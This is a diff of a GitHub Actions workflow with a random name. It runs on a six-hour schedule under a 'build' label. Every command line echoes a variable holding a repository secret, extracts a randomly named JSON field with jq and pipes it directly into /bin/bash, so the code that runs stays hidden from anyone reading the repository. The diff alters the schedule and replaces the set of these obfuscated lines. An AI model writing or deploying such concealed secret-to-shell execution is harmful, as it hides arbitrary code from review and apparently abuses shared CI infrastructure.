@@ -1,9 +1,8 @@
 name: chenqinian3490
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 4/6 * * *'
+    - cron: '6 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,20 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: chenqinian3490
         env:
-          leow3: ${{ secrets.leow3 }}
+          w58148: ${{ secrets.w58148 }}
         run: |
-          echo $leow3 | jq -r .g08996 | /bin/bash
-          echo $ztw27846 | jq -r .hs86154 | /bin/bash
-          echo $um319 | jq -r .fme177 | /bin/bash
-          echo $kur79924 | jq -r .re36 | /bin/bash
-          echo $gkdb93 | jq -r .lhtfv7625 | /bin/bash
-          echo $zvmp85 | jq -r .kux34 | /bin/bash
-          echo $smqaq503 | jq -r .dkho8027 | /bin/bash
-          echo $osp95161 | jq -r .deoap1720 | /bin/bash
-          echo $beye123 | jq -r .bqcw6 | /bin/bash
-          echo $w5321 | jq -r .hufna7696 | /bin/bash
-          echo $ppdr698 | jq -r .jvj349 | /bin/bash
-          echo $uop30177 | jq -r .nuk68 | /bin/bash
-          echo $o58622 | jq -r .dajc63961 | /bin/bash
-          echo $huxqz26973 | jq -r .gzrr28 | /bin/bash
+          echo $w58148 | jq -r .yqov71 | /bin/bash
+          echo $cwxa6216 | jq -r .xit916 | /bin/bash
+          echo $op4447 | jq -r .jry15 | /bin/bash
+          echo $g1 | jq -r .blud6 | /bin/bash
+          echo $xqeth5 | jq -r .o80185 | /bin/bash
+          echo $dksd794 | jq -r .fl2154 | /bin/bash
+          echo $xgsf8 | jq -r .zdggk7524 | /bin/bash
+          echo $ckfy322 | jq -r .nrcrq684 | /bin/bash
+          echo $vly19261 | jq -r .ui00438 | /bin/bash
 
